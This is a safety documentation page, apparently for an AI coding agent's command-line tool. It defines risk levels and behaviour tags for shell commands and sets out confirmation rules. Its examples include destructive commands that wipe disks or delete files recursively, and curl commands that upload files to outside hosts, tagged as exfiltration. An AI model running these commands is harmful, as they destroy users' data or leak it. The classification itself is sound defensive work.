# Safety

All commands will be given a risk level and behavior tags.

Risk Level: One will be assigned:

- Read Only: Read only command
- Normal: Command with risk level below a rm command
- Dangerous: Risk level equivalent or above a rm command on a single file
- Extremely Dangerous: Risk level equivalent to multiple rm commands or will have system-wide consequences or will have security implications

Behavior Tags: Multiple may be selected:

- Safe: Command has no consequential effects; use for Read Only commands only
- Reversible: Command has effects but is reversible
- Write: Command will result in a write
- Delete: Command will result in deletion
- Overwrite: Command may result in overwriting
- Side Effects: Command may result in unintended side effects
- Exfiltration: Command may result in exfiltration of data

Commands that have a risk level of "Normal" or above will always require a confirmation. This includes any command that write, overwrite, delete, or result in **any** side effect.

Commands with a risk level of "Read Only" will be automatically approved without user interaction, unless strict mode is enabled via the `nitro strict` command or the `alwaysConfirm` setting.

Strict Mode:

- Enabled by running `nitro strict` or `nitro s`
- Forces all commands (including "Read Only") to require manual confirmation
- Useful when executing complex or potentially dangerous operations

Evaluation:

- The main LLM responsible for generating the call also labels the call with risk level and behavior tags

Example commands and risk levels:

- `ls folder/`: Read Only
- `ls -la /tmp`: Read Only
- `cat file.txt`: Read Only
- `git show | head -5`: Read Only
- `find . -name "*.py"`: Read Only
- `grep TODO *.md`: Read Only
- `docker ps`: Read Only
- `echo "console.log()" >> file.js`: Normal, Write, Reversible
- `git clone https://...`: Normal, Write, Reversible
- `git push`: Normal, Write
- `npm run build`: Normal, Side Effects, Overwrite (generated artifacts)
- `npm install`: Normal, Side Effects
- `cargo run`: Normal, Side Effects, Overwrite (generated artifacts)
- `brew install package`: Normal, Side Effects
- `chmod u+x ./bin/binary`: Normal, Side Effects, Reversible
- `tar -czf archive.tar.gz folder/`: Normal, Overwrite
- `rm file.txt`: Dangerous, Delete
- `cp file.txt existing.txt`: Dangerous, Overwrite
- `mv file.txt existing.txt`: Dangerous, Overwrite
- `mv file.txt folder/`: Dangerous, Overwrite
- `echo "overwrite" > file.md`: Dangerous, Overwrite
- `docker system prune -a`: Dangerous, Deletion
- `cp -rf ~/Downloads/* /usr/local/bin/`: Extremely Dangerous, Side Effects
- `rm .env`: Extremely Dangerous, Deletion
- `rm *.md`: Extremely Dangerous, Deletion
- `rm -rf folder`: Extremely Dangerous, Deletion
- `git reset --hard HEAD`: Extremely Dangerous, Deletion
- `git push -f origin main`: Extremely Dangerous, Overwrite
- `chmod 777 /usr/bin/somebinary`: Extremely Dangerous, Side Effects
- `dd if=/dev/zero of=/dev/sda`: Extremely Dangerous, Overwrite
- `find . -type f -delete`: Extremely Dangerous, Deletion
- `curl -F 'file=@file.ts' http://company.com`: Extremely Dangerous, Exfiltration
- `curl -T file.txt https://example.com/upload`: Extremely Dangerous, Exfiltration
